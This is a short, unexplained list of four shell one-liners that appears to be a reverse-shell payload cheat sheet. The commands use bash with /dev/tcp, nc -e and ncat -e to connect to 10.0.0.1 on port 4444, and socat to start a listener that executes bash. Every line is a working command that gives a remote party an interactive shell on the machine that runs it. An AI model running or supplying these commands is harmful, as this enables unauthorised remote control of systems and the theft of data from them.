bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc -e /bin/sh 10.0.0.1 4444
ncat 10.0.0.1 4444 -e /bin/bash
socat tcp-listen:4444,reuseaddr exec:'/bin/bash'
